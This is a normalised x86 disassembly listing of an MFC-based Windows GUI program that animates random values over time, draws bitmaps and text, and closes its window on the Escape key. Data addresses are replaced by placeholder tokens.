lea esi [ edi + 0xc ]
test esi esi
je rwxdata
push 0x82
mov ecx esi
call sub_4034ca
lea esi [ edi + 0x4 ]
test esi esi
je rwxdata
cmp [ esi + 0x4 ] 0x0
je rwxdata
push 0x0
push rw-data
push 0xa0
mov ecx esi
call Ordinal_MFC42_2243
mov ecx edi
call sub_4033b5
pop edi
pop esi
retn
cmp [ esi + 0x4 ] 0x0
je rwxdata
mov ecx esi
call Ordinal_MFC42_2414
mov ecx esi
call Ordinal_MFC42_2414
sub_4033b5
mov eax sub_4049d2
call sub_4045f4
push ecx
push ecx
push ebx
push esi
xor ebx ebx
push edi
cmp [ rw-data ] ebx
mov [ ebp - 0x10 ] esp
jne rwxdata
sub esp 0x10
mov esi rw-data
mov edi esp
add ecx 0x14
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x64
movsd [ edi ] [ esi ]
call sub_4035b3
cmp [ rw-data ] ebx
jne rwxdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push 0x8
mov [ rw-data ] eax
mov [ ebp - 0x4 ] ebx
call Ordinal_MFC42_823
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
cmp ecx ebx
mov [ ebp - 0x4 ] 0x1
je rwxdata
cmp [ rw-data ] ebx
jne rwxdata
xor edi edi
call sub_4024b4
mov edi eax
jmp rwxdata
cmp [ rw-data ] ebx
je rwxdata
mov esi [ rand@IAT ]
mov [ ebp - 0x4 ] bl
call esi
push 0x64
cdq
pop ecx
idiv ecx
mov ecx edi
push eax
call sub_40252a
call esi
cdq
mov ecx 0x3e8
idiv ecx
mov ecx edi
push eax
call sub_40252a
push ebx
call [ ExitProcess@IAT ]
push 0x1f
pop eax
cmp [ rw-data ] eax
je rwxdata
sub_403497
mov eax sub_4049e4
call sub_4045f4
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_4034ca
movzx eax [ esp + 0x4 ]
push esi
push eax
push 0x2
mov esi ecx
push eax
call Ordinal_MFC42_1146
push eax
call [ LoadBitmapA@IAT ]
push eax
mov ecx esi
call Ordinal_MFC42_1641
pop esi
retn 0x4
sub_403532
push esi
mov esi ecx
lea ecx [ esi + 0x8 ]
call Ordinal_MFC42_500
mov [ esi ] r--data
call [ GetTickCount@IAT ]
and [ esi + 0x4 ] 0x0
add eax 0xa
mov [ esi + 0x20 ] eax
mov [ esi + 0x1c ] 0x5
mov eax esi
pop esi
retn
sub_40357a
mov eax sub_4049fb
call sub_4045f4
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_4035ee
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x8 ]
call Ordinal_MFC42_772
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_4035b3
push ebx
mov ebx ecx
push esi
push edi
lea edi [ ebx + 0x24 ]
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_4035ee
mov edi [ esp + 0x10 ]
test edi edi
jle rwxdata
pop edi
pop esi
pop ebx
retn 0x14
lea esi [ ebx + 0x8 ]
mov ecx ebx
call sub_40361e
push eax
mov ecx esi
push [ esi + 0x8 ]
call Ordinal_MFC42_5860
dec edi
jne rwxdata
sub_4035ee
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x10 ] edi
jle rwxdata
push 0xffffffff
push 0x0
lea ecx [ esi + 0x8 ]
call Ordinal_MFC42_6142
pop edi
pop esi
retn
mov eax [ esi + 0xc ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je rwxdata
inc edi
cmp edi [ esi + 0x10 ]
jl rwxdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_40361e
mov eax sub_404a12
call sub_4045f4
push ecx
push ecx
push ebx
push esi
push edi
mov esi ecx
push 0x28
call Ordinal_MFC42_823
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je rwxdata
and [ ebp - 0x10 ] 0x0
call sub_4034ee
mov [ ebp - 0x10 ] eax
jmp rwxdata
mov [ ebp - 0x14 ] 0x1
mov eax [ esi + 0x2c ]
sub eax [ esi + 0x24 ]
mov [ ebp - 0x14 ] eax
jmp rwxdata
mov eax [ esi + 0x2c ]
sub eax [ esi + 0x24 ]
je rwxdata
mov [ ebp - 0x14 ] 0x1
mov eax [ esi + 0x30 ]
sub eax [ esi + 0x28 ]
mov [ ebp - 0x14 ] eax
jmp rwxdata
mov ebx [ esi + 0x2c ]
mov edi [ rand@IAT ]
sub ebx [ esi + 0x24 ]
call edi
cdq
idiv [ ebp - 0x14 ]
mov eax ebx
mov ecx edx
cdq
sub eax edx
sar eax 0x1
sub ecx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
fild [ ebp - 0x14 ]
fstp [ eax + 0x8 ]
mov eax [ esi + 0x30 ]
sub eax [ esi + 0x28 ]
je rwxdata
mov [ ebp - 0x14 ] 0x1
mov eax [ esi + 0x2c ]
sub eax [ esi + 0x24 ]
mov [ ebp - 0x14 ] eax
jmp rwxdata
mov ebx [ esi + 0x30 ]
sub ebx [ esi + 0x28 ]
call edi
cdq
idiv [ ebp - 0x14 ]
mov eax ebx
mov ecx edx
cdq
sub eax edx
sar eax 0x1
sub ecx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
fild [ ebp - 0x14 ]
fstp [ eax + 0x10 ]
mov eax [ esi + 0x2c ]
sub eax [ esi + 0x24 ]
je rwxdata
mov ebx [ esi + 0x2c ]
sub ebx [ esi + 0x24 ]
call edi
cdq
idiv [ ebp - 0x14 ]
mov eax ebx
pop edi
pop esi
pop ebx
mov ecx edx
cdq
sub eax edx
sar eax 0x1
sub ecx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0xc ]
fild [ ebp - 0x14 ]
fstp [ eax + 0x18 ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_403722
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x10 ] edi
jle rwxdata
pop edi
pop esi
retn 0x8
mov eax [ esi + 0xc ]
push ecx
fld [ esp + 0x10 ]
push ecx
mov ecx [ eax + edi * 4 ]
fstp [ esp ]
call sub_40108a
inc edi
cmp edi [ esi + 0x10 ]
jl rwxdata
sub_40374c
push ebp
mov ebp esp
push ecx
push edi
xor edi edi
cmp [ ecx + 0x10 ] edi
jle rwxdata
pop edi
leave
retn 0x8
push ebx
push esi
fstp st0
mov eax [ ecx + 0x2c ]
sub eax [ ecx + 0x24 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fld st1
fcompp
fnstsw ax
sahf
fstp st0
jbe rwxdata
mov eax [ ecx + 0xc ]
push 0xfffffffe
fld [ ebp + 0x8 ]
mov esi [ eax + edi * 4 ]
pop ebx
fadd [ esi + 0x18 ]
fst [ esi + 0x18 ]
mov eax [ ecx + 0x2c ]
sub eax [ ecx + 0x24 ]
cdq
idiv ebx
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fld st1
fcompp
fnstsw ax
sahf
jb rwxdata
pop esi
pop ebx
inc edi
cmp edi [ ecx + 0x10 ]
jl rwxdata
jmp rwxdata
fldz
fstp [ esi + 0x18 ]
sub_4037b6
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ GetTickCount@IAT ]
mov esi ecx
call edi
cmp eax [ esi + 0x20 ]
jbe rwxdata
pop edi
pop esi
leave
retn
mov eax [ esi + 0x1c ]
push ecx
neg eax
mov [ ebp - 0x4 ] eax
push ecx
fild [ ebp - 0x4 ]
mov ecx esi
fstp [ esp ]
call sub_40374c
cmp [ esi + 0x4 ] 0x0
je rwxdata
call edi
add eax 0xa
mov [ esi + 0x20 ] eax
fld [ rw-data ]
push ecx
push ecx
fstp [ esp ]
call cos
fmul [ r--data ]
mov ecx esi
fstp [ esp ]
call sub_403722
fld [ rw-data ]
fadd [ r--data ]
fstp [ rw-data ]
sub_403891
mov eax sub_404a2d
call sub_4045f4
sub esp 0x28
push esi
push edi
mov esi ecx
push 0x0
call Ordinal_MFC42_1134
pop ecx
mov ecx esi
call Ordinal_MFC42_2621
push rw-data
mov ecx esi
call Ordinal_MFC42_6117
push 0x4
mov ecx esi
call Ordinal_MFC42_4159
push 0x6c
call Ordinal_MFC42_823
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je rwxdata
xor eax eax
push r--data
push r--data
push r--data
push 0x80
call Ordinal_MFC42_520
jmp rwxdata
mov ecx [ esi + 0x20 ]
push 0x0
call Ordinal_MFC42_6215
mov esi [ esi + 0x20 ]
push [ esi + 0x20 ]
call [ UpdateWindow@IAT ]
xor edi edi
jmp rwxdata
or [ ebp - 0x4 ] 0xffffffff
push eax
mov ecx esi
call Ordinal_MFC42_986
lea ecx [ ebp - 0x34 ]
call Ordinal_MFC42_296
push 0x1
lea eax [ ebp - 0x34 ]
pop edi
mov ecx esi
push eax
mov [ ebp - 0x4 ] edi
call Ordinal_MFC42_5214
lea eax [ ebp - 0x34 ]
mov ecx esi
push eax
call Ordinal_MFC42_5301
test eax eax
jne rwxdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x34 ]
call Ordinal_MFC42_617
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_4039a8
mov eax sub_404a40
call sub_4045f4
sub esp 0x60
lea ecx [ ebp - 0x6c ]
call sub_403962
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x6c ]
call Ordinal_MFC42_2514
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x6c ]
call Ordinal_MFC42_641
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_4039e1
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov ecx [ esi + 0x20 ]
cmp [ ecx + 0xc0 ] ebx
je rwxdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
mov edi [ PeekMessageA@IAT ]
mov ecx [ esi + 0x20 ]
cmp [ ecx + 0xc0 ] ebx
jne rwxdata
cmp [ ebp - 0x18 ] 0x12
je rwxdata
call sub_402f25
mov eax [ esi ]
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx esi
call [ eax + 0x60 ]
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
jmp rwxdata
push 0x1
push ebx
push ebx
lea eax [ ebp - 0x1c ]
push ebx
push eax
call edi
test eax eax
je rwxdata
sub_403a64
mov eax sub_404a55
call sub_4045f4
push ecx
push 0x54
call Ordinal_MFC42_823
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je rwxdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_403aae
sub_403b01
mov eax sub_404a69
call sub_4045f4
push ecx
push 0x68
call Ordinal_MFC42_823
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je rwxdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_403b4b
sub_403b4b
mov eax sub_404a7c
call sub_4045f4
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call Ordinal_MFC42_560
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x44 ]
call sub_40261c
fld [ r--data ]
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
fstp [ esi + 0x60 ]
mov [ esi + 0x4c ] 0x1e
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_403bae
mov eax sub_404a90
call sub_4045f4
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x44 ]
call sub_402656
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call Ordinal_MFC42_813
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_403c04
cmp [ esp + 0x4 ] 0x1b
push esi
mov esi ecx
jne rwxdata
push [ esp + 0x8 ]
lea ecx [ esi + 0x44 ]
call sub_402672
mov ecx esi
call Ordinal_MFC42_2379
call sub_402f3e
push 0x0
push 0x0
push 0x10
push [ eax + 0x20 ]
call [ SendMessageA@IAT ]
jmp rwxdata
pop esi
retn 0xc
sub_403c3b
push ebx
push esi
push edi
mov edi [ GetTickCount@IAT ]
mov esi ecx
call edi
mov ecx [ esi + 0x4c ]
mov edx [ rw-data ]
lea ebx [ eax + ecx * 2 ]
cmp edx ebx
jbe rwxdata
cmp eax edx
jae rwxdata
lea edx [ ecx + eax ]
mov [ rw-data ] edx
call edi
add eax [ esi + 0x4c ]
push 0x1
mov [ rw-data ] eax
pop eax
xor eax eax
jmp rwxdata
pop edi
pop esi
pop ebx
retn
sub_403c7a
mov eax sub_404aac
call sub_4045f4
sub esp 0x50
push esi
mov esi ecx
call sub_403c3b
test eax eax
je rwxdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
lea ecx [ ebp - 0x30 ]
call Ordinal_MFC42_289
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push [ esi + 0x20 ]
call [ GetClientRect@IAT ]
lea eax [ ebp - 0x1c ]
push 0xffffff
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x5c ]
call sub_403d15
push 0x5
mov [ ebp - 0x4 ] 0x1
call [ GetSysColor@IAT ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x5c ]
call Ordinal_MFC42_2754
add esi 0x44
mov ecx esi
call sub_402684
lea eax [ ebp - 0x5c ]
mov ecx esi
push eax
call sub_402690
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x5c ]
call sub_403e09
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x30 ]
call Ordinal_MFC42_613
sub_403d15
mov eax sub_404ac9
call sub_4045f4
push ecx
push ebx
push esi
mov ebx ecx
push edi
mov [ ebp - 0x10 ] ebx
call Ordinal_MFC42_323
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
and [ ebx + 0x14 ] 0x0
lea edi [ ebx + 0x1c ]
mov [ ebx + 0x18 ] eax
and [ ebp - 0x4 ] 0x0
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
test eax eax
mov [ ebx ] r--data
je rwxdata
push eax
call [ CreateCompatibleDC@IAT ]
push eax
mov ecx ebx
call Ordinal_MFC42_1640
push 0x8
call Ordinal_MFC42_823
xor edi edi
pop ecx
cmp eax edi
je rwxdata
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0xc ]
mov [ ebx + 0x10 ] edi
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
sub eax [ esi + 0x4 ]
sub ecx [ esi ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push [ eax + 0x4 ]
call [ CreateCompatibleBitmap@IAT ]
push eax
mov ecx edi
call Ordinal_MFC42_1641
push 0x8
call Ordinal_MFC42_823
pop ecx
mov [ ebp + 0xc ] eax
test eax eax
mov [ ebp - 0x4 ] 0x1
je rwxdata
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov edi eax
xor eax eax
push [ ebp + 0x10 ]
mov ecx eax
call Ordinal_MFC42_283
jmp rwxdata
mov eax [ ebx + 0x10 ]
test eax eax
je rwxdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx + 0x4 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je rwxdata
push eax
push [ ebx + 0x4 ]
call Ordinal_MFC42_5785
mov [ ebx + 0x14 ] eax
mov eax [ ebp + 0x8 ]
lea edi [ ebx + 0x1c ]
mov [ ebx + 0x18 ] eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ ebp - 0xc ]
mov eax ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov eax [ eax + 0x4 ]
sub_403e09
mov eax sub_404adc
call sub_4045f4
push ecx
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
mov edi [ esi + 0x20 ]
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x24 ]
and [ ebp - 0x4 ] 0x0
sub ecx [ esi + 0x1c ]
mov edx [ esi + 0x18 ]
sub eax edi
test esi esi
jne rwxdata
push ebx
mov ebx [ esi + 0x4 ]
mov [ ebp - 0x10 ] ebx
pop ebx
and [ ebp - 0x10 ] esi
jmp rwxdata
push eax
push [ esi + 0x4 ]
call Ordinal_MFC42_5785
mov ecx [ esi + 0x10 ]
test ecx ecx
je rwxdata
mov eax [ eax + 0x4 ]
push 0xcc0020
push edi
push [ esi + 0x1c ]
push [ ebp - 0x10 ]
push eax
push ecx
push edi
push [ esi + 0x1c ]
push [ edx + 0x4 ]
call [ BitBlt@IAT ]
mov eax [ esi + 0x14 ]
test eax eax
je rwxdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call Ordinal_MFC42_640
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_403eb9
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi ecx
call Ordinal_MFC42_2379
mov eax [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
lea ecx [ esi + 0x44 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4026a2
pop esi
leave
retn 0xc
sub_403ef1
mov eax sub_404af0
call sub_4045f4
sub esp 0x54
push esi
mov esi ecx
push esi
lea ecx [ ebp - 0x60 ]
call Ordinal_MFC42_470
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_403c7a
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x60 ]
call Ordinal_MFC42_755
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_403f6e
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ExtTextOutA@IAT ]
pop ebp
retn 0x1c
sub_403f93
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ecx + 0x4 ]
call [ TabbedTextOutA@IAT ]
mov ecx [ ebp + 0x8 ]
movsx edx ax
shr eax 0x10
movsx eax ax
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebp
retn 0x20
sub_403fe7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je rwxdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x4 ]
call [ GrayStringA@IAT ]
pop ebp
retn 0x20
mov eax [ eax + 0x4 ]
sub_404580
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb rwxdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae rwxdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_402b6d
cmp [ rw-data ] ebx
jne rwxdata
call sub_40478a
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne rwxdata
push sub_40479c
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe rwxdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je rwxdata
mov al [ esi ]
cmp al bl
je rwxdata
inc esi
mov [ ebp - 0x74 ] esi
jmp rwxdata
cmp [ esi ] 0x22
jne rwxdata
cmp al 0x22
jne rwxdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je rwxdata
cmp al 0x20
jbe rwxdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp rwxdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4047ac
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4047c4
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne rwxdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_401000
push esi
mov esi ecx
call sub_401025
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_40101c
mov eax ecx
mov [ eax ] r--data
retn
sub_401025
mov [ ecx ] r--data
retn
sub_40108a
fld [ esp + 0x4 ]
push ecx
push ecx
fstp [ esp ]
call sub_40109b
retn 0x8
sub_4024b4
push esi
mov esi ecx
push 0x0
mov [ esi ] r--data
call [ time@IAT ]
push eax
call [ srand@IAT ]
pop ecx
mov eax esi
pop ecx
pop esi
retn
sub_4024d2
push esi
mov esi ecx
call sub_4024ee
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_4024ee
mov [ ecx ] r--data
retn
sub_40261c
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_403073
push eax
mov ecx esi
call sub_40265d
mov eax esi
pop esi
retn
sub_40263a
push esi
mov esi ecx
call sub_402656
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_402656
mov [ ecx ] r--data
retn
sub_40265d
mov eax ecx
mov ecx [ esp + 0x4 ]
cmp ecx [ eax + 0x4 ]
je rwxdata
mov eax [ ecx ]
call [ eax ]
retn 0x4
mov [ eax + 0x4 ] ecx
sub_402672
mov eax [ ecx + 0x4 ]
push [ esp + 0x4 ]
mov edx [ eax ]
push ecx
mov ecx eax
call [ edx + 0x8 ]
retn 0x4
sub_402684
mov eax [ ecx + 0x4 ]
push ecx
mov ecx eax
mov edx [ eax ]
call [ edx + 0x10 ]
retn
sub_402690
mov eax [ ecx + 0x4 ]
push [ esp + 0x4 ]
mov edx [ eax ]
push ecx
mov ecx eax
call [ edx + 0xc ]
retn 0x4
sub_4026be
call sub_4026c8
jmp sub_4026d2
sub_4026c8
mov ecx rw-data
jmp sub_4026f9
sub_4026d2
push sub_4026de
call sub_4045db
pop ecx
retn
sub_4026de
test [ rw-data ] 0x1
jne rwxdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_402732
sub_4026f9
push esi
mov esi ecx
call sub_402982
and [ esi + 0x8 ] 0x0
mov [ esi + 0x4 ] r--data
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_402716
push esi
mov esi ecx
call sub_402732
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_402785
mov eax rw-data
retn
sub_40278b
cmp [ esp + 0x8 ] 0x70
push esi
mov esi ecx
jne rwxdata
pop esi
retn 0x8
call sub_402c8b
push eax
mov ecx esi
push [ esp + 0xc ]
call sub_4029ae
sub_4028b6
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_4028d3
mov [ ecx ] r--data
retn
sub_4028da
retn
sub_4028db
retn 0x4
sub_4028de
push esi
mov esi ecx
call sub_4028fa
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_40292d
push esi
mov esi ecx
call sub_402949
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_40297c
jmp rwxdata
retn
sub_402982
mov eax ecx
mov [ eax ] r--data
retn
sub_40298b
push esi
mov esi ecx
call sub_4029a7
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_4029a7
mov [ ecx ] r--data
retn
sub_4029ae
push [ esp + 0x8 ]
mov ecx [ esp + 0x8 ]
call sub_40265d
retn 0x8
sub_4029be
call sub_4029c8
jmp sub_4029d2
sub_4029c8
mov ecx rw-data
jmp sub_4029f9
sub_4029d2
push sub_4029de
call sub_4045db
pop ecx
retn
sub_4029de
test [ rw-data ] 0x1
jne rwxdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_402a32
sub_4029f9
push esi
mov esi ecx
call sub_402982
and [ esi + 0x8 ] 0x0
mov [ esi + 0x4 ] r--data
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_402a16
push esi
mov esi ecx
call sub_402a32
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_402a85
mov eax rw-data
retn
sub_402b6d
retn
sub_402b98
call sub_402ba2
jmp sub_402bac
sub_402ba2
mov ecx rw-data
jmp sub_402bd3
sub_402bac
push sub_402bb8
call sub_4045db
pop ecx
retn
sub_402bb8
test [ rw-data ] 0x1
jne rwxdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_402c0c
sub_402bd3
push esi
mov esi ecx
call sub_402982
and [ esi + 0x8 ] 0x0
mov [ esi + 0x4 ] r--data
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_402bf0
push esi
mov esi ecx
call sub_402c0c
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_402c8b
mov eax rw-data
retn
sub_402df6
mov eax [ Ordinal_MFC42_1842@IAT ]
retn
sub_402dfc
mov eax r--data
retn
sub_402e02
mov eax [ Ordinal_MFC42_4242@IAT ]
retn
sub_402e08
mov eax r--data
retn
sub_402e61
push esi
mov esi ecx
call sub_402e7d
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_402f19
push [ esp + 0x4 ]
call Ordinal_MFC42_5252
retn 0x4
sub_402f25
call Ordinal_MFC42_2884
mov ecx eax
jmp sub_403c7a
sub_402f31
push [ esp + 0x4 ]
call Ordinal_MFC42_825
pop ecx
retn 0x4
sub_402f3e
call Ordinal_MFC42_1175
test eax eax
je rwxdata
xor eax eax
retn
mov edx [ eax ]
mov ecx eax
call [ edx + 0x7c ]
retn
sub_402f52
call sub_402f5c
jmp sub_402f66
sub_402f5c
mov ecx rw-data
jmp sub_402f8d
sub_402f66
push sub_402f72
call sub_4045db
pop ecx
retn
sub_402f72
test [ rw-data ] 0x1
jne rwxdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
